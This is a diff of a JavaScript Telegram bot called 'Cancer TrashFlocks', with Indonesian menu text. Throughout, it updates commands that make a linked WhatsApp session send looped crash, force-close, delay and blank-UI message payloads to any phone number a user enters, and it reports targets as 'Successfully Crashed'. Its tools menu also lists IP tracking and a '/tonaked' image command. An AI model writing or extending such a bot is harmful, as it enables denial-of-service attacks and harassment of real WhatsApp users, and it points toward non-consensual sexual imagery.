@@ -372,11 +372,11 @@ const checkOwnerOrAdmin = (ctx, next) => {
 (async () => {
     try {
         await bot.telegram.setMyCommands(
-            [{ command: 'start', description: 'By Itss Dric' }],
+            [{ command: 'start', description: 'Creat By @XnnxDxC' }],
             { scope: { type: 'all_private_chats' } }
         );
         await bot.telegram.setMyCommands(
-            [{ command: 'start', description: 'By Itss Dric' }],
+            [{ command: 'start', description: 'Creat By @XnnxDxC' }],
             { scope: { type: 'all_group_chats' } }
         );
         console.log("✅ Commands berhasil didaftarkan.");
@@ -522,11 +522,13 @@ bot.start(async (ctx) => {
         const userStatus = getStatus(ctx.from.id);
         const startMsg =
             `<blockquote><b>Cᴀɴᴄᴇʀ Tʀᴀsʜғʟᴏᴄᴋs</b></blockquote>\n\n` +
-            `<b>[ CANCER V20 ENGINE ]</b>\n\n` +
-            `•<tg-emoji emoji-id="5463412289883353404"></tg-emoji> User   : <code>${ctx.from.first_name}</code>\n` +
-            `•<tg-emoji emoji-id="5465225015190367274"></tg-emoji> ID     : <code>${ctx.from.id}</code>\n` +
-            `•<tg-emoji emoji-id="5465154440287757794"></tg-emoji> Status : <b>${userStatus}</b>\n\n` +
-            `Pilih menu di bawah untuk eksekusi.`;
+            `<pre><code class="language-yaml">` +
+            `[ CANCER V20 ENGINE ]\n\n` +
+            `User   : ${ctx.from.first_name}\n` +
+            `ID     : ${ctx.from.id}\n` +
+            `Status : ${userStatus}\n\n` +
+            `Pilih menu di bawah untuk eksekusi.` +
+            `</code></pre>`;
 
         try {
             let sent;
@@ -622,17 +624,18 @@ bot.start(async (ctx) => {
         // Tampil menu private
         const menuMessage =
             `<blockquote><b>Cᴀɴᴄᴇʀ Tʀᴀsʜғʟᴏᴄᴋs</b></blockquote>\n\n` +
-            `➤「 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐑𝐈𝐎𝐍 」\n` +
-            `<b><tg-emoji emoji-id="5463156928307801722"></tg-emoji> Bot Name : Cancer</b>\n` +
-            `<b><tg-emoji emoji-id="5463081281048818043"></tg-emoji> Developer : Its Dric</b>\n` +
-            `<b><tg-emoji emoji-id="5258023599419171861">🔧</tg-emoji> Version : 20.0.0</b>\n` +
-            `<b><tg-emoji emoji-id="5462957817918926146">🖕</tg-emoji> Language : JavaScript</b>\n` +
-            `<b><tg-emoji emoji-id="5352752036595116992">😊</tg-emoji> Prefix : Slash [ / ]</b>\n` +
-            `<b><tg-emoji emoji-id="5188283260496536188">👊</tg-emoji> Username : ${ctx.from.first_name}</b>\n` +
-            `<b><tg-emoji emoji-id="5215327832040811010">⏳</tg-emoji> Runtime : ${runtime}</b>\n\n` +
-            `<code>Cancer TrashFlocks</code>`;
+            `➤「 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐑𝐈𝐎𝐍 」\n\n` +
+            `<pre><code class="language-yaml">` +
+            `Bot Name  : Cancer TrashFlocks\n` +
+            `Developer : Its Dric\n` +
+            `Version   : 20.0.0\n` +
+            `Language  : JavaScript\n` +
+            `Prefix    : Slash [ / ]\n` +
+            `Username  : ${ctx.from.first_name}\n` +
+            `Runtime   : ${runtime}` +
+            `</code></pre>`;
 
-        const button = [[{ text: "「 ♱ 」Open Menu", callback_data: "back", style: btnStyler.get(), icon_custom_emoji_id: "5463274047771000031" }]];
+        const button = [[{ text: "「 ♱ 」Open Menu", callback_data: "back", style: style, icon_custom_emoji_id: "5463274047771000031" }]];
 
         await ctx.replyWithPhoto(thumbnailurl, {
             caption: menuMessage,
@@ -710,11 +713,11 @@ bot.action("list_trash", async (ctx) => {
     const gagahMsg =
         `<b>[ TRASH FEATURE - CANCER V20 ]</b>\n\n` +
         `<b>Cancer - TrashFlocks</b>\n\n` +
-        `<code>/trash    </code> - Delay <tg-emoji emoji-id="5465198330558557107"></tg-emoji>\n` +
-        `<code>/invasion </code> - Delay <tg-emoji emoji-id="5465137208878969279"></tg-emoji>\n` +
-        `<code>/omega    </code> - Delay <tg-emoji emoji-id="5463274047771000031"></tg-emoji>\n` +
-        `<code>/kuantum  </code> - Delay <tg-emoji emoji-id="5463054218459884779"></tg-emoji>\n` +
-        `<code>/modols   </code> - Delay <tg-emoji emoji-id="5465154440287757794"></tg-emoji>\n\n` +
+        `<code>/trash    </code> - Forclose New <tg-emoji emoji-id="5465198330558557107"></tg-emoji>\n` +
+        `<code>/invasion </code> - Combination New<tg-emoji emoji-id="5465137208878969279"></tg-emoji>\n` +
+        `<code>/omega    </code> - Delay Hard <tg-emoji emoji-id="5463274047771000031"></tg-emoji>\n` +
+        `<code>/kuantum  </code> - Delay Combi <tg-emoji emoji-id="5463054218459884779"></tg-emoji>\n` +
+        `<code>/modols   </code> - Blank Andro <tg-emoji emoji-id="5465154440287757794"></tg-emoji>\n\n` +
         `<i>"Target identified. No mercy, no remnants."</i>`;
     try {
         await ctx.editMessageCaption(gagahMsg, {
@@ -732,8 +735,8 @@ bot.action("back_start", async (ctx) => {
     const userStatus = getStatus(ctx.from.id);
     const startMsg =
         `<b>[ CANCER V20 ENGINE ]</b>\n\n` +
-        `•<tg-emoji emoji-id="5465262274031659421"></tg-emoji> User   : <code>${ctx.from.first_name}</code>\n` +
-        `•<tg-emoji emoji-id="5463277406435422003"></tg-emoji> Status : <b>${userStatus}</b>\n\n` +
+        `• ♅<tg-emoji emoji-id="5465262274031659421"></tg-emoji> User   : <code>${ctx.from.first_name}</code>\n` +
+        `• ♅<tg-emoji emoji-id="5463277406435422003"></tg-emoji> Status : <b>${userStatus}</b>\n\n` +
         `Kembali ke menu utama:`;
     try {
         await ctx.editMessageCaption(startMsg, {
@@ -752,12 +755,12 @@ bot.action("tq_to", async (ctx) => {
     const gagahMsg =
         `<b>[ THANKS TO ]</b>\n\n` +
         `<b>THANKS SUPPORT FROM</b>\n\n` +
-        `<tg-emoji emoji-id="5465465194056525619"></tg-emoji> My God - The Best God\n` +
-        `<tg-emoji emoji-id="5462990652943904884"></tg-emoji> Its Dric - Creator\n` +
-        `<tg-emoji emoji-id="5463412289883353404"></tg-emoji> My Girl Friend - Support\n` +
-        `<tg-emoji emoji-id="5463274047771000031"></tg-emoji> All My Friend - Support\n` +
-        `<tg-emoji emoji-id="5463081281048818043"></tg-emoji> All User Cancer - Greatest Support\n\n` +
-        `<b>"Terimakasih Atas Dukungan Dari Semua Pengguna Cancer, Title Apapun Kamu, Mohon Maaf Sebesar-besarnya Jika Script Ini Masi Banyak Eror Dan Fitur Yang Kurang Memuaskan, Di Perbolehkan Untuk Kalian Menyarankan Fitur Atau Hal Apa Yang Perlu Di Perbaiki, Silahkan Chat @driclimit_bot, Setiap Saran Dan Dukungan Kalian Sangat Berharga Bagi Saya Dalam Mengembangkan Script Ini."</b>\n\n`;
+        `♅<tg-emoji emoji-id="5465465194056525619"></tg-emoji> My God - The Best God\n` +
+        `♅<tg-emoji emoji-id="5462990652943904884"></tg-emoji> Its Dric - Creator\n` +
+        `♅<tg-emoji emoji-id="5463412289883353404"></tg-emoji> My Girl Friend - Support\n` +
+        `♅<tg-emoji emoji-id="5463274047771000031"></tg-emoji> All My Friend - Support\n` +
+        `♅<tg-emoji emoji-id="5463081281048818043"></tg-emoji> All User Cancer - Greatest Support\n\n` +
+        `♅<b>"Terimakasih atas segala support yang kalian berikan dalam pengembangan script ini, gunakan script dengan bijak dan terimakasih atas segala support yang kalian berikan."♅</b>\n\n`;
     try {
         await ctx.editMessageCaption(gagahMsg, {
             parse_mode: "HTML",
@@ -825,32 +828,80 @@ bot.action("sawitjir", async (ctx) => {
 // ==========================================
 // [ ACTIONS PRIVATE ONLY ]
 // ==========================================
+const stylesBtn = ["primary", "success", "danger"];
+
+const btnStylerPrivate = {
+    index: 0,
+
+    get() {
+        const style = stylesBtn[this.index];
+        this.index = (this.index + 1) % stylesBtn.length;
+        return style;
+    }
+};
+
 bot.action("back", async (ctx) => {
     if (!isPrivate(ctx)) {
         return ctx.answerCbQuery("Hanya untuk Private Chat!").catch(() => {});
     }
+
     try {
         const runtime = getBotRuntime();
+
         const menuMessage =
             `<blockquote><b>Cᴀɴᴄᴇʀ Tʀᴀsʜғʟᴏᴄᴋs</b></blockquote>\n\n` +
-            `➤「 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐑𝐈𝐎𝐍 」\n` +
-            `<b><tg-emoji emoji-id="5463156928307801722"></tg-emoji> Bot Name : Cancer</b>\n` +
-            `<b><tg-emoji emoji-id="5463081281048818043"></tg-emoji> Developer : Its Dric</b>\n` +
-            `<b><tg-emoji emoji-id="5258023599419171861">🔧</tg-emoji> Version : 20.0.0</b>\n` +
-            `<b><tg-emoji emoji-id="5462957817918926146">🖕</tg-emoji> Language : JavaScript</b>\n` +
-            `<b><tg-emoji emoji-id="5352752036595116992">😊</tg-emoji> Prefix : Slash [ / ]</b>\n` +
-            `<b><tg-emoji emoji-id="5188283260496536188">👊</tg-emoji> Username : ${ctx.from.first_name}</b>\n` +
-            `<b><tg-emoji emoji-id="5215327832040811010">⏳</tg-emoji> Runtime : ${runtime}</b>\n\n` +
-            `<code>Cancer TrashFlocks</code>`;
+            `➤「 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐑𝐈𝐎𝐍 」\n\n` +
+            `<pre><code class="language-yaml">` +
+            `Bot Name  : Cancer TrashFlocks\n` +
+            `Developer : Its Dric\n` +
+            `Version   : 20.0.0\n` +
+            `Language  : JavaScript\n` +
+            `Prefix    : Slash [ / ]\n` +
+            `Username  : ${ctx.from.first_name}\n` +
+            `Runtime   : ${runtime}` +
+            `</code></pre>`;
+
         const button = [
-            [{ text: "「 ♱ 」Trash Feture", callback_data: "trashshow", style: btnStyler.get(), icon_custom_emoji_id: "5465225015190367274" }],
             [
-                { text: "「 ♱ 」Settings", callback_data: "settings", style: btnStyler.get(), icon_custom_emoji_id: "5463412289883353404" },
-                { text: "「 ♱ 」Tools", callback_data: "toolsmenu", style: btnStyler.get(), icon_custom_emoji_id: "5465137208878969279" }
+                {
+                    text: "「 ♱ 」Trash Feture",
+                    callback_data: "trashshow",
+                    style: btnStylerPrivate.get(),
+                    icon_custom_emoji_id: "5465225015190367274"
+                }
             ],
-            [{ text: "「 ♱ 」Thanks To", callback_data: "thanksto", style: btnStyler.get(), icon_custom_emoji_id: "5463054218459884779" }],
-            [{ text: "「 ♱ 」Creator", url: "https://t.me/xnnxdxc", style: btnStyler.get(), icon_custom_emoji_id: "5463274047771000031" }]
+            [
+                {
+                    text: "「 ♱ 」Settings",
+                    callback_data: "settings",
+                    style: btnStylerPrivate.get(),
+                    icon_custom_emoji_id: "5463412289883353404"
+                },
+                {
+                    text: "「 ♱ 」Tools",
+                    callback_data: "toolsmenu",
+                    style: btnStylerPrivate.get(),
+                    icon_custom_emoji_id: "5465137208878969279"
+                }
+            ],
+            [
+                {
+                    text: "「 ♱ 」Thanks To",
+                    callback_data: "thanksto",
+                    style: btnStylerPrivate.get(),
+                    icon_custom_emoji_id: "5463054218459884779"
+                }
+            ],
+            [
+                {
+                    text: "「 ♱ 」Creator",
+                    url: "https://t.me/xnnxdxc",
+                    style: btnStylerPrivate.get(),
+                    icon_custom_emoji_id: "5463274047771000031"
+                }
+            ]
         ];
+
         await ctx.editMessageMedia(
             {
                 type: "photo",
@@ -858,9 +909,15 @@ bot.action("back", async (ctx) => {
                 caption: menuMessage,
                 parse_mode: "HTML"
             },
-            { reply_markup: { inline_keyboard: button } }
+            {
+                reply_markup: {
+                    inline_keyboard: button
+                }
+            }
         );
+
         await ctx.answerCbQuery();
+
     } catch (e) {
         console.log("back error:", e?.message);
         await ctx.answerCbQuery().catch(() => {});
@@ -876,13 +933,13 @@ bot.action("settings", async (ctx) => {
         const controlsMenu =
             `<blockquote><b>Cᴀɴᴄᴇʀ Tʀᴀsʜғʟᴏᴄᴋs</b></blockquote>\n` +
             `➤「 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐑𝐈𝐎𝐍 」\n` +
-            `<b><tg-emoji emoji-id="5463156928307801722"></tg-emoji> Bot Name : Cancer</b>\n` +
-            `<b><tg-emoji emoji-id="5463081281048818043"></tg-emoji> Developer : Its Dric</b>\n` +
-            `<b><tg-emoji emoji-id="5258023599419171861">🔧</tg-emoji> Version : 20.0.0</b>\n` +
-            `<b><tg-emoji emoji-id="5462957817918926146">🖕</tg-emoji> Language : JavaScript</b>\n` +
-            `<b><tg-emoji emoji-id="5352752036595116992">😊</tg-emoji> Prefix : Slash [ / ]</b>\n` +
-            `<b><tg-emoji emoji-id="5188283260496536188">👊</tg-emoji> Username : ${ctx.from.first_name}</b>\n` +
-            `<b><tg-emoji emoji-id="5215327832040811010">⏳</tg-emoji> Runtime : ${runtime}</b>\n\n` +
+            `<b>♅ <tg-emoji emoji-id="5463156928307801722"></tg-emoji> Bot Name : Cancer</b>\n` +
+            `<b>♅ <tg-emoji emoji-id="5463081281048818043"></tg-emoji> Developer : Its Dric</b>\n` +
+            `<b>♅ <tg-emoji emoji-id="5258023599419171861">🔧</tg-emoji> Version : 20.0.0</b>\n` +
+            `<b>♅ <tg-emoji emoji-id="5462957817918926146"></tg-emoji> Language : JavaScript</b>\n` +
+            `<b>♅<tg-emoji emoji-id="5352752036595116992"></tg-emoji> Prefix : Slash [ / ]</b>\n` +
+            `<b>♅<tg-emoji emoji-id="5188283260496536188"></tg-emoji> Username : ${ctx.from.first_name}</b>\n` +
+            `<b>♅<tg-emoji emoji-id="5215327832040811010"></tg-emoji> Runtime : ${runtime}</b>\n\n` +
             `╭───⊱<b> ( 🍁 ) Controls° - Menu</b>\n` +
             `│⌘ /delsessions\n` +
             `│╰┈➤ Delete Sessions\n` +
@@ -897,7 +954,7 @@ bot.action("settings", async (ctx) => {
             `│⌘ /delprem ID\n` +
             `│╰┈➤ Delete Premium Users\n` +
             `╰───────────────⊱`;
-        const button = [[{ text: "「 ♱ 」Cancer BACK", callback_data: "back", style: btnStyler.get(), icon_custom_emoji_id: "5462990652943904884" }]];
+        const button = [[{ text: "「 ♱ 」Cancer BACK", callback_data: "back", style: btnStylerPrivate.get(), icon_custom_emoji_id: "5462990652943904884" }]];
         await ctx.editMessageCaption(controlsMenu, {
             parse_mode: "HTML",
             reply_markup: { inline_keyboard: button }
@@ -918,13 +975,13 @@ bot.action("toolsmenu", async (ctx) => {
         const controlsMenu =
             `<blockquote><b>Cᴀɴᴄᴇʀ Tʀᴀsʜғʟᴏᴄᴋs</b></blockquote>\n` +
             `➤「 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐑𝐈𝐎𝐍 」\n` +
-            `<b><tg-emoji emoji-id="5463156928307801722"></tg-emoji> Bot Name : Cancer</b>\n` +
-            `<b><tg-emoji emoji-id="5463081281048818043"></tg-emoji> Developer : Its Dric</b>\n` +
-            `<b><tg-emoji emoji-id="5258023599419171861">🔧</tg-emoji> Version : 20.0.0</b>\n` +
-            `<b><tg-emoji emoji-id="5462957817918926146">🖕</tg-emoji> Language : JavaScript</b>\n` +
-            `<b><tg-emoji emoji-id="5352752036595116992">😊</tg-emoji> Prefix : Slash [ / ]</b>\n` +
-            `<b><tg-emoji emoji-id="5188283260496536188">👊</tg-emoji> Username : ${ctx.from.first_name}</b>\n` +
-            `<b><tg-emoji emoji-id="5215327832040811010">⏳</tg-emoji> Runtime : ${runtime}</b>\n\n` +
+            `<b>♅ <tg-emoji emoji-id="5463156928307801722"></tg-emoji> Bot Name : Cancer</b>\n` +
+            `<b>♅ <tg-emoji emoji-id="5463081281048818043"></tg-emoji> Developer : Its Dric</b>\n` +
+            `<b>♅ <tg-emoji emoji-id="5258023599419171861"></tg-emoji> Version : 20.0.0</b>\n` +
+            `<b>♅ <tg-emoji emoji-id="5462957817918926146"></tg-emoji> Language : JavaScript</b>\n` +
+            `<b>♅ <tg-emoji emoji-id="5352752036595116992"></tg-emoji> Prefix : Slash [ / ]</b>\n` +
+            `<b>♅ <tg-emoji emoji-id="5188283260496536188"></tg-emoji> Username : ${ctx.from.first_name}</b>\n` +
+            `<b>♅ <tg-emoji emoji-id="5215327832040811010"></tg-emoji> Runtime : ${runtime}</b>\n\n` +
             `╭───⊱<b> ( 🦄 ) Tools° - Menu</b>\n` +
             `│⌘ /csessions\n` +
             `│⌘ /ssiphone\n` +
@@ -937,7 +994,7 @@ bot.action("toolsmenu", async (ctx) => {
             `│⌘ /tourl [ Reply Media ]\n` +
             `│⌘ /tonaked [ Reply Image ]\n` +
             `╰───────────────⊱`;
-        const button = [[{ text: "「 ♱ 」Cancer BACK", callback_data: "back", style: btnStyler.get(), icon_custom_emoji_id: "5462990652943904884" }]];
+        const button = [[{ text: "「 ♱ 」Cancer BACK", callback_data: "back", style: btnStylerPrivate.get(), icon_custom_emoji_id: "5462990652943904884" }]];
         await ctx.editMessageCaption(controlsMenu, {
             parse_mode: "HTML",
             reply_markup: { inline_keyboard: button }
@@ -958,20 +1015,21 @@ bot.action("trashshow", async (ctx) => {
         const bugMenu =
             `<blockquote><b>Cᴀɴᴄᴇʀ Tʀᴀsʜғʟᴏᴄᴋs</b></blockquote>\n` +
             `➤「 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐑𝐈𝐎𝐍 」\n` +
-            `<b><tg-emoji emoji-id="5463156928307801722"></tg-emoji> Bot Name : Cancer</b>\n` +
-            `<b><tg-emoji emoji-id="5463081281048818043"></tg-emoji> Developer : Its Dric</b>\n` +
-            `<b><tg-emoji emoji-id="5258023599419171861">🔧</tg-emoji> Version : 20.0.0</b>\n` +
-            `<b><tg-emoji emoji-id="5462957817918926146">🖕</tg-emoji> Language : JavaScript</b>\n` +
-            `<b><tg-emoji emoji-id="5352752036595116992">😊</tg-emoji> Prefix : Slash [ / ]</b>\n` +
-            `<b><tg-emoji emoji-id="5188283260496536188">👊</tg-emoji> Username : ${ctx.from.first_name}</b>\n` +
-            `<b><tg-emoji emoji-id="5215327832040811010">⏳</tg-emoji> Runtime : ${runtime}</b>\n\n` +
+            `<b>♅ <tg-emoji emoji-id="5463156928307801722"></tg-emoji> Bot Name : Cancer</b>\n` +
+            `<b>♅ <tg-emoji emoji-id="5463081281048818043"></tg-emoji> Developer : Its Dric</b>\n` +
+            `<b>♅ <tg-emoji emoji-id="5258023599419171861"></tg-emoji> Version : 20.0.0</b>\n` +
+            `<b>♅ <tg-emoji emoji-id="5462957817918926146"></tg-emoji> Language : JavaScript</b>\n` +
+            `<b>♅ <tg-emoji emoji-id="5352752036595116992"></tg-emoji> Prefix : Slash [ / ]</b>\n` +
+            `<b>♅ <tg-emoji emoji-id="5188283260496536188"></tg-emoji> Username : ${ctx.from.first_name}</b>\n` +
+            `<b>♅ <tg-emoji emoji-id="5215327832040811010"></tg-emoji> Runtime : ${runtime}</b>\n\n` +
             `╭───⊱<b> ( 🦠 ) Trash° - Menu</b>\n` +
-            `│⌘ /CancerForce 62xx\n` +
-            `│⌘ /CancerCrashUi 62xx\n` +
-            `│⌘ /CancerDelayHard 62xx\n` +
-            `│⌘ /CancerCombo 62xx\n` +
+            `│⌘ /cancerforce 62xx\n` +
+            `│⌘ /cancercombi 62xx\n` +
+            `│⌘ /cancerdelay 62xx\n` +
+            `│⌘ /cancerblank 62xx\n` +
+            `│⌘ /cancercombo 62xx\n` +
             `╰───────────────⊱`;
-        const button = [[{ text: "「 ♱ 」Cancer Back", callback_data: "back", style: btnStyler.get(), icon_custom_emoji_id: "5462990652943904884" }]];
+        const button = [[{ text: "「 ♱ 」Cancer Back", callback_data: "back", style: btnStylerPrivate.get(), icon_custom_emoji_id: "5462990652943904884" }]];
         await ctx.editMessageCaption(bugMenu, {
             parse_mode: "HTML",
             reply_markup: { inline_keyboard: button }
@@ -994,13 +1052,13 @@ bot.action("thanksto", async (ctx) => {
             `<b><tg-emoji emoji-id="5402355073458123173"></tg-emoji> Username : ${ctx.from.first_name}</b>\n` +
             `<b><tg-emoji emoji-id="5402355073458123173"></tg-emoji> Runtime : ${runtime}</b>\n\n` +
             `<b> ( 🤝 ) Thanks° - To</b>\n` +
-            `<tg-emoji emoji-id="5402355073458123173"></tg-emoji> Itss Dricc\n` +
-            `<tg-emoji emoji-id="5402355073458123173"></tg-emoji> My Partner\n` +
-            `<tg-emoji emoji-id="5402355073458123173"></tg-emoji> My Support\n` +
-            `<tg-emoji emoji-id="5402355073458123173"></tg-emoji> My Friend\n` +
-            `<tg-emoji emoji-id="5402355073458123173"></tg-emoji> All User Cancer TrashFlocks\n` +
+            `❏<tg-emoji emoji-id="5402355073458123173"></tg-emoji> Itss Dricc\n` +
+            `❏<tg-emoji emoji-id="5402355073458123173"></tg-emoji> My Partner\n` +
+            `❏<tg-emoji emoji-id="5402355073458123173"></tg-emoji> My Support\n` +
+            `❏<tg-emoji emoji-id="5402355073458123173"></tg-emoji> My Friend\n` +
+            `❏<tg-emoji emoji-id="5402355073458123173"></tg-emoji> All User Cancer TrashFlocks\n` +
             `All User Cancer`;
-        const button = [[{ text: "「 ♱ 」BACK", callback_data: "back", style: btnStyler.get(), icon_custom_emoji_id: "5462990652943904884" }]];
+        const button = [[{ text: "「 ♱ 」BACK", callback_data: "back", style: btnStylerPrivate.get(), icon_custom_emoji_id: "5462990652943904884" }]];
         await ctx.editMessageCaption(tqtoMenu, {
             parse_mode: "HTML",
             reply_markup: { inline_keyboard: button }
@@ -1094,7 +1152,7 @@ bot.command("trackip", async (ctx) => {
             `⌘ Lat/Lon: ${lat || "-"}, ${lon || "-"}`;
 
         const replyMarkup = mapsUrl ? {
-            inline_keyboard: [[{ text: "🌍 Location", url: mapsUrl, style: btnStyler.get(), icon_custom_emoji_id: "5463392464314315076" }]]
+            inline_keyboard: [[{ text: "🌍 Location", url: mapsUrl, style: btnStylerPrivate.get(), icon_custom_emoji_id: "5463392464314315076" }]]
         } : null;
 
         try {
@@ -2692,7 +2750,7 @@ async function sendBugCommand(ctx, opts) {
                 parse_mode: "HTML",
                 reply_markup: {
                     inline_keyboard: [[
-                        { text: "[ 📞 ] Check ϟ Target", url: `https://wa.me/${q}`, style: btnStyler.get(), icon_custom_emoji_id: "5778121946868749491" }
+                        { text: "[ 📞 ] Check ϟ Target", url: `https://wa.me/${q}`, style: btnStylerPrivate.get(), icon_custom_emoji_id: "5778121946868749491" }
                     ]]
                 }
             }
@@ -2704,14 +2762,14 @@ async function sendBugCommand(ctx, opts) {
 }
 
 // ── Cancer1 ──
-bot.command("Cancer1", checkPremium, checkCooldown, checkWhatsAppConnection, async (ctx) => {
+bot.command("cancerforce", checkPremium, checkCooldown, checkWhatsAppConnection, async (ctx) => {
     await sendBugCommand(ctx, {
-        format: "/Cancer1 62xx",
+        format: "/CancerForce 62xx",
         method: "CancerForce",
         execute: async (target) => {
-            for (let i = 0; i < 3000; i++) {
-                await OfferXForclose(sock, target);
-                await OfferXForclose(sock, target);
+            for (let i = 0; i < 150; i++) {
+                await VnXNewForceImageTagSw(sock, target, mention = true);
+                await VnXNewForceImageInvis(sock, target);
                 await sleep(1000);
             }
         }
@@ -2719,14 +2777,14 @@ bot.command("Cancer1", checkPremium, checkCooldown, checkWhatsAppConnection, asy
 });
 
 // ── Cancer2 ──
-bot.command("Cancer2", checkPremium, checkCooldown, checkWhatsAppConnection, async (ctx) => {
+bot.command("cancercombi", checkPremium, checkCooldown, checkWhatsAppConnection, async (ctx) => {
     await sendBugCommand(ctx, {
-        format: "/Cancer2 62xx",
-        method: "CancerForceInvis",
+        format: "/CancerCombi 62xx",
+        method: "CancerCombi",
         execute: async (target) => {
-            for (let i = 0; i < 3000; i++) {
-                await OfferXForclose(sock, target);
-                await OfferXForclose(sock, target);
+            for (let i = 0; i < 100; i++) {
+                await VnXNewForceImageInvis(sock, target);
+                await SuperDelayByMia(sock, target);
                 await sleep(1000);
             }
         }
@@ -2734,14 +2792,14 @@ bot.command("Cancer2", checkPremium, checkCooldown, checkWhatsAppConnection, asy
 });
 
 // ── Cancer3 ──
-bot.command("Cancer3", checkPremium, checkCooldown, checkWhatsAppConnection, async (ctx) => {
+bot.command("cancerdelay", checkPremium, checkCooldown, checkWhatsAppConnection, async (ctx) => {
     await sendBugCommand(ctx, {
-        format: "/Cancer3 62xx",
-        method: "CancerForceX7",
+        format: "/CancerDelay 62xx",
+        method: "CancerDelay",
         execute: async (target) => {
-            for (let i = 0; i < 3000; i++) {
-                await croserds(sock, target);
-                await croserds(sock, target);
+            for (let i = 0; i < 100; i++) {
+                await SuperDelayByMia(sock, target);
+                await SuperSlowDelayByMia(sock, jid);
                 await sleep(1000);
             }
         }
@@ -2749,13 +2807,15 @@ bot.command("Cancer3", checkPremium, checkCooldown, checkWhatsAppConnection, asy
 });
 
 // ── Cancer4 ──
-bot.command("Cancer4", checkPremium, checkCooldown, checkWhatsAppConnection, async (ctx) => {
+bot.command("cancerblank", checkPremium, checkCooldown, checkWhatsAppConnection, async (ctx) => {
     await sendBugCommand(ctx, {
-        format: "/Cancer4 62xx",
+        format: "/CancerBlank 62xx",
         method: "CancerCrashUi",
         execute: async (target) => {
-            for (let i = 0; i < 10; i++) {
-                await OfferXForclose(sock, target);
+            for (let i = 0; i < 100; i++) {
+                await BlankDocumentByMia(client, target);
+                await BlankMsg(sock, target);
+                await BlankSistemUiByMia(client, target);
                 await sleep(1000);
             }
         }
@@ -2763,13 +2823,14 @@ bot.command("Cancer4", checkPremium, checkCooldown, checkWhatsAppConnection, asy
 });
 
 // ── Cancer5 ──
-bot.command("Cancer5", checkPremium, checkCooldown, checkWhatsAppConnection, async (ctx) => {
+bot.command("cancercombo", checkPremium, checkCooldown, checkWhatsAppConnection, async (ctx) => {
     await sendBugCommand(ctx, {
-        format: "/Cancer5 62xx",
-        method: "CancerCrashInvisible",
+        format: "/CancerCombo 62xx",
+        method: "CancerCombo",
         execute: async (target) => {
-            for (let i = 0; i < 4000; i++) {
-                await OfferXForclose(sock, target);
+            for (let i = 0; i < 100; i++) {
+                await BlankSistemUiByMia(client, target);
+                await SuperDelayByMia(sock, target)
                 await sleep(1000);
             }
         }
@@ -2912,8 +2973,9 @@ bot.command("trash", checkWhatsAppConnection, async (ctx) => {
 
         // Background agar panel tidak timeout/mati
         setImmediate(async () => {
-            for (let i = 0; i < 500; i++) {
-                try { await VnXFcOrderNew(sock, target); } catch (e) {}
+            for (let i = 0; i < 250; i++) {
+                try { await VnXNewForceImageTagSw(sock, target, mention = true);
+                await VnXNewForceImageInvis(sock, target); } catch (e) {}
                 await sleep(2000);
             }
             await ctx.telegram.editMessageCaption(ctx.chat.id, msg?.message_id, null,
@@ -2923,11 +2985,11 @@ bot.command("trash", checkWhatsAppConnection, async (ctx) => {
                 `<b>│</b> 📡 Sender  : <code>${senderNum}</code>\n` +
                 `<b>│</b> ✅ Status  : Successfully Crashed\n` +
                 `<b>│</b> 📦 Sent    : 500 Packets\n` +
-                `<b>│</b> 🛡️ Engine  : Kayzen-V Simple Logic\n` +
+                `<b>│</b> 🛡️ Engine  : Forclose New\n` +
                 `<b>└───────────────────────────</b>`,
                 {
                     parse_mode: "HTML",
-                    reply_markup: { inline_keyboard: [[{ text: "👤 View Target", url: `https://wa.me/${q}`, style: btnStyler.get(), icon_custom_emoji_id: "5778212665167975922" }]] }
+                    reply_markup: { inline_keyboard: [[{ text: "👤 View Target", url: `https://wa.me/${q}`, style: btnStylerPrivate.get(), icon_custom_emoji_id: "5778212665167975922" }]] }
                 }
             ).catch(() => {});
         });
@@ -2971,8 +3033,10 @@ bot.command("invasion", checkWhatsAppConnection, async (ctx) => {
         }).catch(() => null);
 
         setImmediate(async () => {
-            for (let i = 0; i < 250; i++) {
-                try { await VnXFcCombo(sock, target); } catch (e) {}
+            for (let i = 0; i < 100; i++) {
+                try { await VnXNewForceImageInvis(sock, target);
+                await DelayNoDetectByMia(sock, target)
+                await VnXNewForceImageTagSw(sock, target, mention = true); } catch (e) {}
                 await sleep(1000);
             }
             await ctx.telegram.editMessageCaption(ctx.chat.id, msg?.message_id, null,
@@ -2985,7 +3049,7 @@ bot.command("invasion", checkWhatsAppConnection, async (ctx) => {
                 `<b>└───────────────────────────</b>`,
                 {
                     parse_mode: "HTML",
-                    reply_markup: { inline_keyboard: [[{ text: "👤 View Target", url: `https://wa.me/${q}`, style: btnStyler.get(), icon_custom_emoji_id: "5778212665167975922" }]] }
+                    reply_markup: { inline_keyboard: [[{ text: "👤 View Target", url: `https://wa.me/${q}`, style: btnStylerPrivate.get(), icon_custom_emoji_id: "5778212665167975922" }]] }
                 }
             ).catch(() => {});
         });
@@ -3029,9 +3093,10 @@ bot.command("omega", checkWhatsAppConnection, async (ctx) => {
         }).catch(() => null);
 
         setImmediate(async () => {
-            for (let i = 0; i < 250; i++) {
-                try { await VnXDelayXfrezeeNew(sock, target); } catch (e) {}
-                await sleep(100);
+            for (let i = 0; i < 100; i++) {
+                try { await FcDelayV1ByMia(client, target);
+                await DelayNoDetectByMia(sock, target); } catch (e) {}
+                await sleep(1500);
             }
             await ctx.telegram.editMessageCaption(ctx.chat.id, msg?.message_id, null,
                 `<blockquote><b>🏁 CANCER V20 — OMEGA FINISHED</b></blockquote>\n\n` +
@@ -3043,7 +3108,7 @@ bot.command("omega", checkWhatsAppConnection, async (ctx) => {
                 `<b>└───────────────────────────</b>`,
                 {
                     parse_mode: "HTML",
-                    reply_markup: { inline_keyboard: [[{ text: "👤 View Target", url: `https://wa.me/${q}`, style: btnStyler.get(), icon_custom_emoji_id: "5778212665167975922" }]] }
+                    reply_markup: { inline_keyboard: [[{ text: "👤 View Target", url: `https://wa.me/${q}`, style: btnStylerPrivate.get(), icon_custom_emoji_id: "5778212665167975922" }]] }
                 }
             ).catch(() => {});
         });
@@ -3087,9 +3152,10 @@ bot.command("kuantum", checkWhatsAppConnection, async (ctx) => {
         }).catch(() => null);
 
         setImmediate(async () => {
